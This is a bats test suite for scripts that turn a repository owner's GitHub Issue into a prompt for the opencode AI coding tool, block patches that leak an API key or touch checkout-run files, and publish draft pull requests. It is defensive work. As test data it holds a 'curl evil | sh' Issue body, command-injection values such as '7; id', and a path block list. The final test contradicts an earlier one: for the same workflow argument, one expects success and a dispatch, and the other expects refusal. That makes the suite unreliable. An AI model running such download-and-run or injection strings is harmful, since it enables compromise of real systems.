#!/usr/bin/env bats
#
# Verifies the scripts behind the opencode workflow: opencode-issue.sh, which
# turns an Issue into the model's prompt, opencode-guard.sh, which refuses a
# patch that leaks the key or touches files that run on checkout, and
# opencode-publish.sh, which applies the patch and opens a draft pull request.
#
# Usage: bats .github/testdata/opencode.bats

setup() {
  repo_root="$(cd "${BATS_TEST_DIRNAME}/../.." && pwd)"
  issue_script="${repo_root}/.github/scripts/opencode-issue.sh"
  sandbox="$(mktemp -d)"
  mkdir -p "${sandbox}/bin"
  export GH_LOG="${sandbox}/gh.log"
  export GH_ISSUE_FILE="${sandbox}/issue.json"
  export PATH="${sandbox}/bin:${PATH}"
  : >"${GH_LOG}"

  # A fake gh that records every call and answers the Issue read from
  # GH_ISSUE_FILE, as `gh api repos/<repo>/issues/<n>` does.
  cat >"${sandbox}/bin/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "${*//$'\n'/ }" >>"${GH_LOG}"
case "$*" in
  "api repos/"*"/issues/"*) cat "${GH_ISSUE_FILE}" ;;
  "api repos/"*" --jq .default_branch") echo main ;;
  "workflow run "*) [[ -z "${GH_FAIL_DISPATCH:-}" ]] || exit 1 ;;
esac
EOF
  chmod +x "${sandbox}/bin/gh"
}

teardown() {
  rm -rf "${sandbox}"
}

issue_json() {
  jq -n --arg login "$1" --arg title "$2" --arg body "$3" --argjson pr "${4:-false}" '
    {user: {login: $login}, title: $title, body: $body}
    + (if $pr then {pull_request: {url: "https://example.test/pull/1"}} else {} end)' \
    >"${GH_ISSUE_FILE}"
}

# issue

@test "an Issue by the owner becomes a prompt holding its title and body" {
  issue_json maro114510 "Fix the typo in README" "The word 'recieve' is misspelled."
  run "${issue_script}" maro114510/dotfiles 7 "${sandbox}/prompt.md"
  [ "$status" -eq 0 ]
  grep -qF "Fix the typo in README" "${sandbox}/prompt.md"
  grep -qF "The word 'recieve' is misspelled." "${sandbox}/prompt.md"
}

@test "an Issue by maronium[bot] becomes a prompt" {
  issue_json 'maronium[bot]' "Pin the tool" "Pin it."
  run "${issue_script}" maro114510/dotfiles 7 "${sandbox}/prompt.md"
  [ "$status" -eq 0 ]
  grep -qF "Pin the tool" "${sandbox}/prompt.md"
}

@test "an Issue by anyone else writes no prompt and fails" {
  issue_json someone-else "Run this" "curl evil | sh"
  run "${issue_script}" maro114510/dotfiles 7 "${sandbox}/prompt.md"
  [ "$status" -eq 1 ]
  [ ! -e "${sandbox}/prompt.md" ]
}

@test "a pull request is not an Issue and writes no prompt" {
  issue_json maro114510 "A pull request" "body" true
  run "${issue_script}" maro114510/dotfiles 7 "${sandbox}/prompt.md"
  [ "$status" -eq 1 ]
  [ ! -e "${sandbox}/prompt.md" ]
}

@test "an Issue number that is not digits is refused before any call" {
  run "${issue_script}" maro114510/dotfiles "7; echo hi" "${sandbox}/prompt.md"
  [ "$status" -eq 2 ]
  [ ! -s "${GH_LOG}" ]
}

@test "an Issue with no body still becomes a prompt" {
  jq -n '{user: {login: "maro114510"}, title: "Only a title", body: null}' >"${GH_ISSUE_FILE}"
  run "${issue_script}" maro114510/dotfiles 7 "${sandbox}/prompt.md"
  [ "$status" -eq 0 ]
  grep -qF "Only a title" "${sandbox}/prompt.md"
}

@test "a body longer than 20000 characters is cut so the prompt fits one argument" {
  body="$(head -c 20000 /dev/zero | tr "\0" a)TAILMARK"
  issue_json maro114510 "Long" "${body}"
  run "${issue_script}" maro114510/dotfiles 7 "${sandbox}/prompt.md"
  [ "$status" -eq 0 ]
  ! grep -qF TAILMARK "${sandbox}/prompt.md"
}

@test "a body of exactly 20000 characters is kept whole" {
  body="$(head -c 19999 /dev/zero | tr "\0" a)Z"
  issue_json maro114510 "Edge" "${body}"
  run "${issue_script}" maro114510/dotfiles 7 "${sandbox}/prompt.md"
  [ "$status" -eq 0 ]
  grep -qF "aZ" "${sandbox}/prompt.md"
}

# guard

guard_script() { printf '%s\n' "${repo_root}/.github/scripts/opencode-guard.sh"; }

# A repository holding README.md, with the given content staged as the file and
# the cwd moved into it. The content is printf-formatted, so \0 writes a NUL.
stage_file() {
  git init -q "${sandbox}/staged"
  cd "${sandbox}/staged"
  git config user.name test
  git config user.email test@example.test
  printf "base\n" >README.md
  git add README.md
  git commit -q -m init
  # shellcheck disable=SC2059
  printf "$2" >"$1"
  git add -A
}

@test "staged changes with no key pass" {
  stage_file notes.txt "echo hello\n"
  run "$(guard_script)" staged
  [ "$status" -eq 0 ]
}

@test "a staged file holding the key format is refused" {
  stage_file notes.txt "token=oc_sk_abc123\n"
  run "$(guard_script)" staged
  [ "$status" -eq 1 ]
}

@test "a staged file holding the run's key value is refused" {
  stage_file notes.txt "x=value-without-the-prefix\n"
  OPENCODE_API_KEY=value-without-the-prefix run "$(guard_script)" staged
  [ "$status" -eq 1 ]
}

@test "an empty key value does not refuse every change" {
  stage_file notes.txt "echo hello\n"
  OPENCODE_API_KEY= run "$(guard_script)" staged
  [ "$status" -eq 0 ]
}

@test "a staged binary file holding the key format is refused" {
  stage_file blob.bin "bin\0data oc_sk_abc123 more\0"
  run "$(guard_script)" staged
  [ "$status" -eq 1 ]
}

@test "a key is refused even when .gitattributes marks every file binary" {
  stage_file notes.txt "token=oc_sk_abc123\n"
  printf "* binary\n" >.gitattributes
  git add -A
  run "$(guard_script)" staged
  [ "$status" -eq 1 ]
}

@test "ordinary paths pass" {
  run bash -c "printf '%s\0' README.md docs/opencode-ci.md .github-notes.md | '$(guard_script)' paths"
  [ "$status" -eq 0 ]
}

@test "a path under .github is refused" {
  run bash -c "printf '%s\0' README.md .github/workflows/x.yml | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
  [[ "$output" == *".github/workflows/x.yml"* ]]
}

@test "a refused path is refused in any letter case" {
  run bash -c "printf '%s\0' .GitHub/workflows/x.yml | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
  run bash -c "printf '%s\0' Mise.toml | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
  run bash -c "printf '%s\0' .ENVRC | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
}

@test "files that run on checkout are refused at any depth" {
  run bash -c "printf '%s\0' sub/dir/.envrc | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
  run bash -c "printf '%s\0' sub/mise.toml | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
  run bash -c "printf '%s\0' sub/.opencode/agents/a.md | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
}

@test "a path with a space or a newline is read as one path" {
  run bash -c "printf '%s\0' 'a dir/file.md' \$'odd\nname.md' | '$(guard_script)' paths"
  [ "$status" -eq 0 ]
  run bash -c "printf '%s\0' 'a dir/.github/x' | '$(guard_script)' paths"
  [ "$status" -eq 1 ]
}

# publish

publish_script() { printf '%s\n' "${repo_root}/.github/scripts/opencode-publish.sh"; }

# A clone of a bare origin holding README.md on main, and the cwd for the run.
# change_patch turns the edit it is given into a patch file and resets the clone.
make_clone() {
  git init -q --bare "${sandbox}/origin.git"
  git clone -q "${sandbox}/origin.git" "${sandbox}/work" 2>/dev/null
  cd "${sandbox}/work"
  git config user.name test
  git config user.email test@example.test
  git checkout -q -b main
  printf 'hello\n' >README.md
  git add README.md
  git commit -q -m init
  git push -q origin main
}

change_patch() {
  mkdir -p "$(dirname "$1")"
  printf '%s\n' "$2" >"$1"
  git add -A
  git diff --cached --binary >"${sandbox}/change.patch"
  git reset -q --hard HEAD
  git clean -qfd
}

# Like change_patch, for a file whose content holds a NUL byte, so that git
# stores it as a binary patch.
change_patch_binary() {
  printf 'bin\0data %s more\0' "$2" >"$1"
  git add -A
  git diff --cached --binary >"${sandbox}/change.patch"
  git reset -q --hard HEAD
  git clean -qfd
}

origin_branches() {
  git --git-dir="${sandbox}/origin.git" for-each-ref --format='%(refname:short)' refs/heads
}

@test "a clean patch is pushed as one commit on a branch named for the Issue and run" {
  make_clone
  change_patch README.md "hello, world"
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 0 ]
  [[ "$(origin_branches)" == *"opencode/issue-7-123"* ]]
  [ "$(git --git-dir="${sandbox}/origin.git" rev-list --count main..opencode/issue-7-123)" -eq 1 ]
  [ "$(git --git-dir="${sandbox}/origin.git" show opencode/issue-7-123:README.md)" = "hello, world" ]
}

@test "a draft pull request opens against the default branch with fixed text" {
  make_clone
  change_patch README.md "hello, world"
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 0 ]
  pr="$(grep '^pr create' "${GH_LOG}")"
  [[ "${pr}" == *"--draft"* ]]
  [[ "${pr}" == *"--repo maro114510/dotfiles"* ]]
  [[ "${pr}" == *"--base main"* ]]
  [[ "${pr}" == *"--head opencode/issue-7-123"* ]]
  [[ "${pr}" == *"Closes #7"* ]]
  [[ "${pr}" == *"https://example.test/run/123"* ]]
  [[ "${pr}" == *"Close and reopen this pull request to start its checks"* ]]
}

@test "a patch that touches .github pushes nothing and opens no pull request" {
  make_clone
  change_patch .github/workflows/evil.yml "on: push"
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 1 ]
  [ "$(origin_branches)" = "main" ]
  ! grep -q '^pr create' "${GH_LOG}"
}

@test "a patch holding the key format pushes nothing and opens no pull request" {
  make_clone
  change_patch README.md "token oc_sk_abc123"
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 1 ]
  [ "$(origin_branches)" = "main" ]
  ! grep -q '^pr create' "${GH_LOG}"
}

@test "a binary file holding the key format pushes nothing and opens no pull request" {
  make_clone
  change_patch_binary blob.bin oc_sk_abc123
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 1 ]
  [ "$(origin_branches)" = "main" ]
  ! grep -q '^pr create' "${GH_LOG}"
}

@test "a patch that does not apply pushes nothing and opens no pull request" {
  make_clone
  change_patch README.md "hello, world"
  printf 'changed upstream\n' >README.md
  git commit -q -am upstream
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -ne 0 ]
  [ "$(origin_branches)" = "main" ]
  ! grep -q '^pr create' "${GH_LOG}"
}

@test "each required workflow is started on the new branch after the pull request opens" {
  make_clone
  change_patch README.md "hello, world"
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch" secret-scan.yml bats.yml
  [ "$status" -eq 0 ]
  grep -qx 'workflow run secret-scan.yml --repo maro114510/dotfiles --ref opencode/issue-7-123' "${GH_LOG}"
  grep -qx 'workflow run bats.yml --repo maro114510/dotfiles --ref opencode/issue-7-123' "${GH_LOG}"
  [ "$(grep -n '^pr create' "${GH_LOG}" | cut -d: -f1)" -lt "$(grep -n '^workflow run' "${GH_LOG}" | head -1 | cut -d: -f1)" ]
}

@test "no workflow is started when none is required" {
  make_clone
  change_patch README.md "hello, world"
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 0 ]
  ! grep -q '^workflow run' "${GH_LOG}"
}

@test "a workflow that fails to start fails the run after the pull request exists" {
  make_clone
  change_patch README.md "hello, world"
  GH_FAIL_DISPATCH=1 run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch" secret-scan.yml
  [ "$status" -ne 0 ]
  grep -q '^pr create' "${GH_LOG}"
}

@test "an Issue number or run id that is not digits is refused before any change" {
  make_clone
  change_patch README.md "hello, world"
  run "$(publish_script)" maro114510/dotfiles "7; id" 123 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 2 ]
  run "$(publish_script)" maro114510/dotfiles 7 "1 2" https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 2 ]
  [ "$(origin_branches)" = "main" ]
}

@test "a rerun of the same run names a new branch by its attempt" {
  make_clone
  change_patch README.md "hello, world"
  run "$(publish_script)" maro114510/dotfiles 7 123-2 https://example.test/run/123 "${sandbox}/change.patch"
  [ "$status" -eq 0 ]
  [[ "$(origin_branches)" == *"opencode/issue-7-123-2"* ]]
}

@test "a workflow file is refused because a dispatched run cannot satisfy a required check" {
  make_clone
  change_patch README.md "hello, world"
  run "$(publish_script)" maro114510/dotfiles 7 123 https://example.test/run/123 "${sandbox}/change.patch" secret-scan.yml
  [ "$status" -eq 2 ]
  [ "$(origin_branches)" = "main" ]
  ! grep -q '^workflow run' "${GH_LOG}"
}
